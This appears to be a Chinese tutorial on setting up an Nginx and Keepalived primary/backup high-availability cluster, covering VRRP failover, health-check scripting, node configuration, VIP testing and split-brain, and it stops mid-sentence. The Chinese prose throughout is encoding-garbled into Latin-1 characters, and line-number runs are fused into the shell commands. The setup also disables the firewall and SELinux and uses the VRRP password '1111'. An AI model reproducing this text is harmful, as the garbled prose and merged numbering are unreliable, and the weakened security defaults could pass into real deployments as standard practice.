å®ç°é«˜å¯ç”¨ï¼Œä½œä¸ºä¸€ä¸ªé«˜æ€§èƒ½é›†ç¾¤è½¯ä»¶ï¼Œå®ƒè¿˜èƒ½å®ç°å¯¹é›†ç¾¤ä¸­æœåŠ¡å™¨è¿è¡ŒçŠ¶æ€çš„ç›‘æ§ä»¥åŠæ•…éšœéš”ç¦»ã€‚Keepalived å·¥ä½œåœ¨ TCP/IP å‚è€ƒæ¨¡å‹çš„ ä¸‰å±‚ã€å››å±‚ã€äº”å±‚ï¼Œä¹Ÿå°±æ˜¯åˆ†åˆ«ä¸ºï¼šç½‘ç»œå±‚ï¼Œä¼ è¾“å±‚å’Œåº”ç”¨å±‚ï¼Œæ ¹æ® TCPã€IP å‚æ•°æ¨¡å‹éš”å±‚æ‰€èƒ½å®ç°çš„åŠŸèƒ½ï¼ŒKeepalived è¿è¡Œæœºåˆ¶å¦‚ä¸‹ï¼š åœ¨ç½‘ç»œå±‚ï¼š è¿è¡Œ 4 ä¸ªé‡è¦çš„åè®®ï¼šäº’è”ç½‘ç»œ IP åè®®ï¼Œäº’è”ç½‘ç»œå¯æ§åˆ¶æŠ¥æ–‡åè®® ICMPã€åœ°å€è½¬æ¢åè®® ARPã€åå‘åœ°å€è½¬æ¢åè®® RARPï¼ŒKeepalived åœ¨ç½‘ç»œå±‚é‡‡ç”¨æœ€å¸¸è§çš„å·¥ä½œæ–¹å¼æ˜¯é€šè¿‡ ICMP åè®®å‘æœåŠ¡å™¨é›†ç¾¤ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹å‘é€ä¸€ä¸ª ICMP æ•°æ®åŒ… (æœ‰ç‚¹ç±»ä¼¼ä¸ Ping çš„åŠŸèƒ½)ï¼Œ å¦‚æœæŸä¸ªèŠ‚ç‚¹æ²¡æœ‰è¿”å›å“åº”æ•°æ®åŒ…ï¼Œé‚£ä¹ˆè®¤ä¸ºè¯¥èŠ‚ç‚¹å‘ç”Ÿäº†æ•…éšœï¼ŒKeepalived å°†æŠ¥å‘Šè¿™ä¸ªèŠ‚ç‚¹å¤±æ•ˆï¼Œå¹¶ä»æœåŠ¡å™¨é›†ç¾¤ä¸­å‰”é™¤æ•…éšœèŠ‚ç‚¹ï¼› åœ¨ä¼ è¾“å±‚ï¼š æä¾›äº†ä¸¤ä¸ªä¸»è¦çš„åè®®ï¼šä¼ è¾“æ§åˆ¶åè®® TCP å’Œç”¨æˆ·æ•°æ®åè®® UDPï¼Œä¼ è¾“æ§åˆ¶åè®® TCP å¯ä»¥æä¾›å¯é çš„æ•°æ®è¾“å‡ºæœåŠ¡ã€ IP åœ°å€å’Œç«¯å£ï¼Œä»£è¡¨ TCP çš„ä¸€ä¸ªè¿æ¥ç«¯ï¼Œè¦è·å¾— TCP æœåŠ¡ï¼Œéœ€è¦åœ¨å‘é€æœºçš„ä¸€ä¸ªç«¯å£å’Œæ¥æ”¶æœºçš„ä¸€ä¸ªç«¯å£ä¸Šå»ºç«‹è¿æ¥ï¼Œè€Œ Keepalived åœ¨ä¼ è¾“å±‚é‡Œåˆ©ç”¨äº† TCP åè®®çš„ç«¯å£è¿æ¥å’Œæ‰«ææŠ€æœ¯æ¥åˆ¤æ–­é›†ç¾¤èŠ‚ç‚¹çš„ç«¯å£æ˜¯å¦æ­£å¸¸ï¼Œæ¯”å¦‚å¯¹äºå¸¸è§çš„ WEB æœåŠ¡å™¨ 80 ç«¯å£ã€‚æˆ–è€… SSH æœåŠ¡ 22 ç«¯å£ï¼ŒKeepalived ä¸€æ—¦åœ¨ä¼ è¾“å±‚æ¢æµ‹åˆ°è¿™äº›ç«¯å£å·æ²¡æœ‰æ•°æ®å“åº”å’Œæ•°æ®è¿”å›ï¼Œå°±è®¤ä¸ºè¿™äº›ç«¯å£å‘ç”Ÿå¼‚å¸¸ï¼Œç„¶åå¼ºåˆ¶å°†è¿™äº›ç«¯å£æ‰€å¯¹åº”çš„èŠ‚ç‚¹ä»æœåŠ¡å™¨é›†ç¾¤ä¸­å‰”é™¤æ‰ï¼› åœ¨åº”ç”¨å±‚ï¼šå¯ä»¥è¿è¡Œ FTPï¼ŒTELNETï¼ŒSMTPï¼ŒDNS ç­‰å„ç§ä¸åŒç±»å‹çš„é«˜å±‚åè®®ï¼ŒKeepalived çš„è¿è¡Œæ–¹å¼ä¹Ÿæ›´åŠ å…¨é¢åŒ–å’Œå¤æ‚åŒ–ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ Keepalived å·¥ä½œæ–¹å¼ï¼Œä¾‹å¦‚ï¼šå¯ä»¥é€šè¿‡ç¼–å†™ç¨‹åºæˆ–è€…è„šæœ¬æ¥è¿è¡Œ Keepalivedï¼Œè€Œ Keepalived å°†æ ¹æ®ç”¨æˆ·çš„è®¾å®šå‚æ•°æ£€æµ‹å„ç§ç¨‹åºæˆ–è€…æœåŠ¡æ˜¯å¦å…è®¸æ­£å¸¸ï¼Œå¦‚æœ Keepalived çš„æ£€æµ‹ç»“æœå’Œç”¨æˆ·è®¾å®šçš„ä¸ä¸€è‡´æ—¶ï¼ŒKeepalived å°†æŠŠå¯¹åº”çš„æœåŠ¡å™¨ä»æœåŠ¡å™¨é›†ç¾¤ä¸­å‰”é™¤ï¼› Keepalived é«˜å¯ç”¨æœåŠ¡å¯¹ä¹‹é—´çš„æ•…éšœåˆ‡æ¢è½¬ç§»ï¼Œæ˜¯é€šè¿‡ VRRP æ¥å®ç°çš„ã€‚åœ¨ Keepalived æœåŠ¡å·¥ä½œæ—¶ï¼Œä¸» Master èŠ‚ç‚¹ä¼šä¸æ–­åœ°å‘å¤‡èŠ‚ç‚¹å‘é€ï¼ˆå¤šæ’­çš„æ–¹å¼ï¼‰å¿ƒè·³æ¶ˆæ¯ï¼Œç”¨æ¥å‘Šè¯‰å¤‡ Backup èŠ‚ç‚¹è‡ªå·±è¿˜æ´»ç€ã€‚å½“ä¸»èŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œå°±æ— æ³•å‘é€å¿ƒè·³çš„æ¶ˆæ¯äº†ï¼Œå¤‡èŠ‚ç‚¹ä¹Ÿå› æ­¤æ— æ³•ç»§ç»­æ£€æµ‹åˆ°æ¥è‡ªä¸»èŠ‚ç‚¹çš„å¿ƒè·³äº†ã€‚äºæ˜¯å°±ä¼šè°ƒç”¨è‡ªèº«çš„æ¥ç®¡ç¨‹åºï¼Œæ¥ç®¡ä¸»èŠ‚ç‚¹çš„ IP èµ„æºå’ŒæœåŠ¡ã€‚å½“ä¸»èŠ‚ç‚¹æ¢å¤æ—¶ï¼Œå¤‡èŠ‚ç‚¹åˆä¼šé‡Šæ”¾ä¸»èŠ‚ç‚¹æ•…éšœæ—¶è‡ªèº«æ¥ç®¡çš„ IP èµ„æºå’ŒæœåŠ¡ï¼Œæ¢å¤åˆ°åŸæ¥çš„å¤‡ç”¨è§’è‰²ã€‚ Keepalived çš„ä½“ç³»ç»“æ„ ç®€å•æ¨¡å—ä»‹ç»ï¼š 1ï¼‰SchedulerI/OMultiplexer æ˜¯ä¸€ä¸ª I/O å¤ç”¨åˆ†å‘è°ƒåº¦å™¨ï¼Œå®ƒè´Ÿè½½å®‰æ’ Keepalived æ‰€æœ‰å†…éƒ¨çš„ä»»åŠ¡è¯·æ±‚ 2ï¼‰Memory Mngt æ˜¯ä¸€ä¸ªå†…å­˜ç®¡ç†æœºåˆ¶ï¼Œè¿™ä¸ªæ¡†æ¶æä¾›äº†è®¿é—®å†…å­˜çš„ä¸€äº›é€šç”¨æ–¹æ³• 3ï¼‰Control Plane æ˜¯ Keepalived çš„æ§åˆ¶ç‰ˆé¢ï¼Œå¯ä»¥å®ç°å¯¹é…ç½®æ–‡ä»¶ç¼–è¯‘å’Œè§£æ 4ï¼‰Core componets è¿™éƒ¨åˆ†ä¸»è¦åŒ…å«äº† 5 ä¸ªéƒ¨åˆ† aï¼‰çœ‹é—¨ç‹— (Watchdog) ï¼šæ˜¯è®¡ç®—æœºå¯é é¢†åŸŸä¸­æä¸ºç®€å•åˆéå¸¸æœ‰æ•ˆçš„æ£€æµ‹å·¥å…·ï¼ŒKeepalived æ­£æ˜¯é€šè¿‡å®ƒç›‘æ§ Checkers å’Œ VRRP è¿›ç¨‹çš„ bï¼‰æ£€æŸ¥è€… (Checkers) : æ˜¯ Keepalived æœ€åŸºç¡€ã€æœ€ä¸»è¦çš„åŠŸèƒ½ï¼Œå¯ä»¥å®ç°å¯¹æœåŠ¡å™¨è¿è¡ŒçŠ¶æ€æ£€æµ‹å’Œæ•…éšœéš”ç¦» cï¼‰VRRP æ¨¡å— (VRRP Stack) : æ˜¯ Keepalived å¼•ç”¨ VRRP åŠŸèƒ½ï¼Œå¯ä»¥å®ç° HA é›†ç¾¤ä¸­å¤±è´¥åˆ‡æ¢åŠŸèƒ½ï¼Œè´Ÿè´£è´Ÿè½½å‡è¡¡å™¨ä¹‹é—´çš„å¤±è´¥åˆ‡æ¢ FailOver dï¼‰IPVS æ¨¡å— (IPVS wrapper) : æ˜¯ IPVS åŠŸèƒ½çš„ä¸€ä¸ªå®ç°ï¼ŒIPVSwarrper æ¨¡å—å°†å¯ä»¥è®¾ç½®å¥½çš„ IPVS è§„åˆ™å‘é€çš„å†…æ ¸ç©ºé—´å¹¶ä¸”æä¾›ç»™ IPVS æ¨¡å—ï¼Œæœ€ç»ˆå®ç° IPVS æ¨¡å—çš„è´Ÿè½½åŠŸèƒ½ eï¼‰VIP åˆ‡æ¢ (Netlink Reflector) ï¼šç”¨æ¥å®ç°é«˜å¯ç”¨é›†ç¾¤ Failover æ—¶è™šæ‹Ÿ IP (VIP) çš„è®¾ç½®å’Œåˆ‡æ¢ ç”±ä¸Šå›¾å¯çŸ¥ï¼Œä¸¤ä¸ªå­è¿›ç¨‹éƒ½è¢«ç³»ç»Ÿ WatchDog çœ‹ç®¡ï¼Œhealthchecker å­è¿›ç¨‹å®ç°æ£€æŸ¥å„è‡ªæœåŠ¡å™¨çš„å¥åº·ç¨‹åº¦ï¼Œä¾‹å¦‚ HTTPã€LVS ç­‰ç­‰ï¼Œå¦‚æœ healthchecker å­è¿›ç¨‹æ£€æŸ¥åˆ° MASTER ä¸ŠæœåŠ¡ä¸å¯ç”¨ï¼Œå°±ä¼šé€šçŸ¥æœ¬æœºä¸Šçš„å…„å¼Ÿ VRRP å­è¿›ç¨‹ï¼Œè®©å®ƒåˆ é™¤é€šå‘Šï¼Œå¹¶ä¸”å»æ‰è™šæ‹Ÿ IPï¼Œè½¬æ¢ä¸º BACKUP çŠ¶æ€ Nginx + Keepalived æ­å»ºé«˜å¯ç”¨é›†ç¾¤éƒ¨ç½²æ¶æ„å›¾æœ¬æ–‡é‡‡ç”¨çš„æ˜¯ Nginx + Keepalived åŒæœºä¸»å¤‡æ¶æ„ï¼ˆä¸»ä»æ¨¡å¼ï¼‰ï¼Œå³ä½¿ç”¨ä¸€ä¸ª VIP åœ°å€ï¼ŒNginx ä½¿ç”¨ 2 å°æœºå™¨ï¼Œä¸€å°åšä¸»èŠ‚ç‚¹ï¼ˆMasterï¼‰ï¼Œä¸€å°åšå¤‡èŠ‚ç‚¹ï¼ˆBackupï¼‰ï¼Œä½†åŒæ—¶åªæœ‰ä¸€å°æœºå™¨å·¥ä½œï¼Œå¦ä¸€å°å¤‡ç”¨æœºå™¨åœ¨ä¸»æœºå™¨ä¸å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œå¤„äºç©ºé—²çŠ¶æ€ï¼Œä»…ä»…ç”¨äºç¾å¤‡ã€‚ æœåŠ¡å™¨è§„åˆ’ è§’è‰² IP è½¯ä»¶ è¿è¡Œç¯å¢ƒ Master èŠ‚ç‚¹ 192.168.1.163 CentOS 7ã€Nginxã€Keepalived Vbox è™šæ‹Ÿæœº Backup èŠ‚ç‚¹ 192.168.1.109 CentOS 7ã€Nginxã€Keepalived VBox è™šæ‹Ÿæœº å‡†å¤‡å·¥ä½œå…³é—­é˜²ç«å¢™ 12345# ä¸´æ—¶å…³é—­# systemctl stop firewalld# æ°¸ä¹…å…³é—­# systemctl disable firewalld å…³é—­ selinux 12345# ä¸´æ—¶å…³é—­# setenforce 0# æ°¸ä¹…å…³é—­# sed -i \'s/enforcing/disabled/\' /etc/selinux/config è½¯ä»¶å®‰è£…è¦æ±‚åœ¨ Master ä¸ Backup èŠ‚ç‚¹ä¸Šéƒ½å®‰è£…å¥½ Nginx å’Œ Keepalivedï¼Œå»ºè®®ä½¿ç”¨ç¼–è¯‘å®‰è£…çš„æ–¹å¼ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒNginx ä¸ Keepalived ä¹Ÿå¯ä»¥å®‰è£…åœ¨ä¸ç”¨çš„ç‰©ç†æœºå™¨ä¸Šã€‚ Nginx ç¼–è¯‘å®‰è£…12345# åˆ›å»ºnginxç”¨æˆ·ç»„# groupadd nginx# åˆ›å»ºnginxç”¨æˆ·ï¼ˆä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd -g nginx nginx -s /bin/false 12# å®‰è£…ä¾èµ–# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel 1234567891011121314151617181920212223242526272829303132# ä¸‹è½½# wget http://nginx.org/download/nginx-1.17.1.tar.gz# è§£å‹# tar -xvf nginx-1.17.1.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd nginx-1.17.1# é…ç½®./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# åå°å¯åŠ¨Nginx# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf# éªŒè¯è®¿é—®Nginx# curl -X GET 127.0.0.1# æŸ¥çœ‹Nginxçš„è¿è¡ŒçŠ¶æ€# ps -aux|grep nginx Keepalived ç¼–è¯‘å®‰è£…12# å®‰è£…ä¾èµ–# yum -y install curl gcc libnl3-devel net-snmp-devel libnl libnl-devel libnfnetlink-devel openssl openssl-devel 1234567891011121314151617181920212223242526272829303132## Keepalivedå®˜ç½‘ä¸‹è½½åœ°å€ï¼šhttps://www.keepalived.org/download.html# ä¸‹è½½# wget http://keepalived.org/software/keepalived-2.0.18.tar.gz# è§£å‹# tar -xvf keepalived-2.0.18.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd keepalived-2.0.18# é…ç½®# ./configure --prefix=/usr/local/keepalived# ç¡®ä¿ "./configure" å‘½ä»¤æ‰§è¡Œå®Œåï¼Œè¾“å‡ºçš„ä»¥ä¸‹æ”¯æŒé¡¹éƒ½ä¸ºYesfwmark socket support : YesUse VRRP Framework : YesUse VRRP VMAC : YesUse VRRP authentication : YesWith ip rules/routes : Yes# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# åˆ›å»ºå­˜æ”¾Keepalivedé…ç½®æ–‡ä»¶çš„ç›®å½•# mkdir -p /etc/keepalived# æ‹·è´Keepalivedé»˜è®¤çš„é…ç½®æ–‡ä»¶# cp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived# è®¾ç½®Keepalivedå¼€æœºè‡ªå¯åŠ¨# systemctl enable keepalived.service Keepalived æ ¸å¿ƒé…ç½®åœ¨ Makster å’Œ Backup èŠ‚ç‚¹åˆ†åˆ«åˆ›å»ºæ£€æŸ¥ Nginx å¥åº·çŠ¶æ€çš„è„šæœ¬ /etc/keepalived/nginx_check.sh 123456789#!/bin/bashA=`ps -C nginx --no-header | wc -l`if [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf sleep 2 if [ `ps -C nginx --no-header | wc -l` -eq 0 ];then killall keepalived fifi 12# è„šæœ¬æˆæƒæ‰§è¡Œ# chmod +x /etc/keepalived/nginx_check.sh Keepalived æ˜¯æœåŠ¡å™¨çº§åˆ«çš„ï¼Œåªç›‘æ§æœåŠ¡å™¨ï¼ŒNginx å®•æœºäº†ï¼Œæ˜¯æ²¡æœ‰åŠæ³•æ¥ç®¡çš„ã€‚æ¯”å¦‚ï¼Œè¿™é‡Œæ˜¯ç”¨ Nginx åšè´Ÿè½½å‡è¡¡åˆ†å‘è¯·æ±‚çš„æ•°æ®åŒ…çš„ï¼Œå¦‚æœ Master èŠ‚ç‚¹çš„ Keepalived æœåŠ¡æ­£å¸¸è¿è¡Œï¼Œè€Œ Nginx è¿è¡Œå¼‚å¸¸ï¼Œé‚£ä¹ˆå°†ä¼šå‡ºç° Nginx è´Ÿè½½å‡è¡¡æœåŠ¡å¤±çµï¼Œæ— æ³•åˆ‡æ¢åˆ° Nginx å¤‡ç”¨çš„è´Ÿè½½å‡è¡¡å™¨ä¸Šï¼Œåç«¯çš„ Web æœåŠ¡å™¨æ— æ³•æ”¶åˆ°è¯·æ±‚ã€‚æ‰€ä»¥ï¼Œåº”è¯¥è¦æ£€æµ‹ Nginx çš„æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œå¦‚æœä¸æ˜¯æ­£å¸¸è¿è¡Œï¼Œé¦–å…ˆå°è¯•å¯åŠ¨ Nginx çš„æœåŠ¡ï¼›è‹¥ Nginx é‡å¯å¤±è´¥ï¼Œå°±åº”è¯¥å…³é—­æ‰è¯¥èŠ‚ç‚¹ä¸Šçš„ Keepalived çš„æœåŠ¡ï¼Œè¿™æ ·æ‰èƒ½è‡ªåŠ¨åˆ‡æ¢åˆ° Keepalived çš„ Backup èŠ‚ç‚¹ä¸Šã€‚ Keepalived çš„é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc # æŒ‡å®šæ”¶ä»¶äºº } # notification_email_from Alexandre.Cassen@firewall.loc # æŒ‡å®šå‘ä»¶äºº # smtp_server 192.168.200.1 # SMTPæœåŠ¡å™¨åœ°å€ # smtp_connect_timeout 30 # SMTPæœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´ router_id LVS_1 # å¿…å¡«ï¼Œæ ‡è¯†æœ¬èŠ‚ç‚¹çš„å­—ç¬¦ä¸²ï¼Œåœ¨ä¸åŒçš„KeepalivedæœåŠ¡å™¨é‡Œå”¯ä¸€ï¼Œé€šå¸¸ä¸ºhostnameï¼Œä½†ä¸ä¸€å®šéå¾—æ˜¯hostnameï¼Œæ•…éšœå‘ç”Ÿæ—¶ï¼Œå‘é‚®ä»¶é€šçŸ¥æ—¶ä¼šç”¨åˆ° vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" # æ£€æµ‹æœåŠ¡å¥åº·çŠ¶æ€çš„Shellè„šæœ¬ interval 2 # æ¯éš”å¤šé•¿æ—¶é—´æ¢æµ‹ä¸€æ¬¡ weight -20 # å¦‚æœæ¡ä»¶æˆç«‹çš„è¯ï¼Œåˆ™æƒé‡-20}vrrp_instance VI_1 { # å®šä¹‰è™šæ‹Ÿè·¯ç”±ï¼ŒVI_1ä¸ºè™šæ‹Ÿè·¯ç”±çš„æ ‡ç¤ºç¬¦ï¼Œå¯ä»¥æ˜¯è‡ªå®šä¹‰åç§°ï¼Œå…è®¸å®šä¹‰å¤šä¸ªè™šæ‹Ÿè·¯ç”± state MASTER # å¿…å¡«ï¼Œå¯ä»¥æ˜¯MASTERæˆ–BACKUPï¼Œä¸è¿‡å½“å…¶ä»–èŠ‚ç‚¹Keepalivedå¯åŠ¨æ—¶ä¼šå°†Priorityæ¯”è¾ƒå¤§çš„èŠ‚ç‚¹é€‰ä¸¾ä¸ºMASTER interface enp0s3 # å¿…å¡«ï¼ŒèŠ‚ç‚¹å›ºæœ‰IPï¼ˆéVIPï¼‰çš„ç½‘å¡ï¼Œç”¨æ¥å‘VRRPåŒ…åšå¿ƒè·³æ£€æµ‹ mcast_src_ip 192.168.1.109 # æœ¬æœºçš„IP virtual_router_id 51 # å¿…å¡«ï¼Œè™šæ‹Ÿè·¯ç”±IDï¼Œå–å€¼åœ¨0-255ä¹‹é—´ï¼Œç”¨æ¥åŒºåˆ†å¤šä¸ªInstanceçš„VRRPç»„æ’­ï¼ŒåŒä¸€ç½‘æ®µå†…IDä¸èƒ½é‡å¤ï¼Œä¸»å¤‡æœºå™¨çš„è¯¥å€¼å¿…é¡»ä¸ºä¸€æ · priority 100 # å¿…å¡«ï¼Œç”¨æ¥é€‰ä¸¾Masterçš„ï¼Œè¦æˆä¸ºMasteré‚£ä¹ˆè¿™ä¸ªé€‰é¡¹çš„å€¼æœ€å¥½é«˜äºå…¶ä»–æœºå™¨50ä¸ªç‚¹ï¼Œè¯¥é¡¹å–å€¼èŒƒå›´æ˜¯1-255(åœ¨æ­¤èŒƒå›´ä¹‹å¤–ä¼šè¢«è¯†åˆ«æˆé»˜è®¤å€¼100) advert_int 1 # å¿…å¡«ï¼Œæ£€æŸ¥é—´éš”é»˜è®¤ä¸º1ç§’ï¼Œå³1ç§’è¿›è¡Œä¸€æ¬¡Masteré€‰ä¸¾ï¼ˆå¯ä»¥è®¤ä¸ºæ˜¯å¥åº·æŸ¥æ£€æ—¶é—´é—´éš”ï¼‰ authentication { # å¿…å¡«ï¼Œè®¤è¯åŒºåŸŸï¼Œè®¤è¯ç±»å‹æœ‰PASSå’ŒHAï¼ˆIPSECï¼‰ï¼Œæ¨èä½¿ç”¨PASSï¼ˆå¯†ç åªè¯†åˆ«å‰8ä½ï¼‰ï¼Œä¸»å¤‡é…ç½®å¿…é¡»ä¸€æ · auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 # å¿…å¡«ï¼Œè™šæ‹ŸVIPåœ°å€ï¼Œå»ºè®®åç¼€åŠ ä¸Š"/24"ï¼Œå…è®¸æœ‰å¤šä¸ª } track_script { # æ£€æµ‹æœåŠ¡å¥åº·çŠ¶æ€çš„Shellè„šæœ¬ chk_nginx }} åœ¨ Makster èŠ‚ç‚¹åˆ›å»º Keepalived çš„ä¸»é…ç½®æ–‡ä»¶ /etc/keepalived/keepalived.confï¼Œé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_1 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state MASTER interface enp0s3 mcast_src_ip 192.168.1.163 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script { chk_nginx }} åœ¨ Backup èŠ‚ç‚¹åˆ›å»º Keepalived çš„ä¸»é…ç½®æ–‡ä»¶ /etc/keepalived/keepalived.confï¼Œé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼Œä¸ Master èŠ‚ç‚¹çš„æœ€å¤§å‚æ•°åŒºåˆ«æ˜¯ï¼šrouter_id LVS_2ã€state BACKUPã€mcast_src_ip 192.168.1.109 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_2 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state BACKUP interface enp0s3 virtual_router_id 51 mcast_src_ip 192.168.1.109 priority 90 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script{ chk_nginx }} åˆ†åˆ«åœ¨ Master èŠ‚ç‚¹å’Œ Backup èŠ‚ç‚¹å¯åŠ¨ Keepalived çš„æœåŠ¡ 123456789# å¯åŠ¨Keepalived# service keepalived start# æŸ¥çœ‹è¿è¡ŒçŠ¶æ€# service keepalived status# æŸ¥çœ‹å¯åŠ¨çš„æ—¥å¿—ä¿¡æ¯# more /var/log/messages# journalctl -u keepalived æµ‹è¯•è™šæ‹Ÿ IPMaster èŠ‚ç‚¹æŸ¥çœ‹è™šæ‹Ÿ IPåœ¨ Master èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹èŠ‚ç‚¹çš„ IP çŠ¶æ€ 1# ip addr åœ¨ Master èŠ‚ç‚¹å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†è™šæ‹Ÿ IP 192.168.1.186 Backup èŠ‚ç‚¹æŸ¥çœ‹è™šæ‹Ÿ IPåœ¨ Backup èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹èŠ‚ç‚¹çš„ IP çŠ¶æ€ 1# ip addr åœ¨ Backup èŠ‚ç‚¹é»˜è®¤ä¸ä¼šçœ‹åˆ°ç”Ÿæˆçš„è™šæ‹Ÿ IPï¼Œå¦‚æœç”Ÿæˆé‚£å°±æ˜¯ Keepalived çš„é…ç½®æ–‡ä»¶å‡ºç°äº†é”™è¯¯ï¼Œå³å¤‡èŠ‚ç‚¹å’Œä¸»èŠ‚ç‚¹äº‰ç”¨ IP èµ„æºï¼Œè¿™ä¸ªç°è±¡å«åš è„‘è£‚ ä½¿ç”¨è™šæ‹Ÿ IP è®¿é—® Nginxåˆ†åˆ«åœ¨ Master èŠ‚ç‚¹å’Œ Backup èŠ‚ç‚¹ä¸Šï¼ŒéªŒè¯æ˜¯å¦å¯é€šè¿‡è™šæ‹Ÿ IP è®¿é—®æœ¬åœ°çš„ Nginx æœåŠ¡ 12345# ç¡®ä¿å¯ä»¥Pingå¾—é€šè™šæ‹ŸIP# ping 192.168.1.186# è®¿é—®Nginx# curl -X GET 192.168.1.186 å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå»ºè®®é¢å¤–åœ¨å®¿ä¸»æœºä¸Šæµ‹è¯•æ˜¯å¦å¯ä»¥è®¿é—® VIP ä¸»å¤‡æœåŠ¡å™¨é«˜å¯ç”¨åˆ‡æ¢å…³é—­ Master èŠ‚ç‚¹çš„ Keepalived æœåŠ¡ 1# service keepalived stop æŸ¥çœ‹ Backup èŠ‚ç‚¹æ˜¯å¦ä¼šç”Ÿæˆè™šæ‹Ÿ IP 192.168.1.186 é‡æ–°å¯åŠ¨ Master çš„ Keepalived æœåŠ¡ï¼Œç„¶åæŸ¥çœ‹ Master å’Œ Backup çš„è™šæ‹Ÿ IPï¼Œæ­¤æ—¶ä¸»èŠ‚ç‚¹åº”è¯¥ä¼šå°†è™šæ‹Ÿ IP æŠ¢å¤ºå›æ¥ 1# service keepalived restar Keepalived è„‘è£‚ï¼ˆä¸»å¤‡èŠ‚ç‚¹å‡æœ‰ VIPï¼‰è„‘è£‚ï¼ˆsplit-brainï¼‰æŒ‡åœ¨ä¸€ä¸ªé«˜å¯ç”¨ï¼ˆHAï¼‰ç³»ç»Ÿä¸­ï¼Œå½“è”ç³»ç€çš„ä¸¤ä¸ªèŠ‚ç‚¹æ–­å¼€è”ç³»æ—¶ï¼Œæœ¬æ¥ä¸ºä¸€ä¸ªæ•´ä½“çš„ç³»ç»Ÿï¼Œåˆ†è£‚ä¸ºä¸¤ä¸ªç‹¬ç«‹èŠ‚ç‚¹ï¼Œè¿™æ—¶ä¸¤ä¸ªèŠ‚ç‚¹å¼€å§‹äº‰æŠ¢å…±äº«èµ„æºï¼Œç»“æœä¼šå¯¼è‡´ç³»ç»Ÿæ··ä¹±ï¼Œæ•°æ®æŸåã€‚å¯¹äºæ— çŠ¶æ€æœåŠ¡çš„ HAï¼Œæ— æ‰€è°“è„‘è£‚ä¸è„‘è£‚ï¼›ä½†å¯¹æœ‰çŠ¶æ€æœåŠ¡ï¼ˆæ¯”å¦‚ MySQLï¼‰çš„ HAï¼Œå¿…é¡»è¦ä¸¥æ ¼é˜²æ­¢è„‘è£‚ã€‚ è„‘è£‚åŸå› ä¸€èˆ¬æ¥è¯´è„‘è£‚é—®é¢˜æœ‰ä»¥ä¸‹è¿™å‡ ç§åŸå› ï¼š é«˜å¯ç”¨æœåŠ¡å™¨ä¸Šå¼€å¯äº† iptables é˜²ç«å¢™ï¼Œé˜»æ­¢äº†å¿ƒè·³ä¼ æ¶ˆæ¯è¾“ é«˜å¯ç”¨æœåŠ¡å™¨ä¸Šå¿ƒè·³ç½‘å¡åœ°å€ç­‰ä¿¡æ¯é…ç½®ä¸æ­£ç¡®ï¼Œå¯¼è‡´å‘é€å¿ƒè·³å¤±è´¥ å…¶ä»–æœåŠ¡é…ç½®ä¸å½“çš„åŸå› ï¼Œå¦‚å¿ƒè·³æ–¹å¼ä¸åŒï¼Œå¿ƒè·³å¹¿æ’­å†²çªï¼Œè½¯ä»¶ Bug ç­‰ é«˜å¯ç”¨æœåŠ¡å™¨å¯¹ä¹‹é—´å¿ƒè·³çº¿é“¾è·¯å‘ç”Ÿæ•…éšœï¼Œå¯¼è‡´æ— 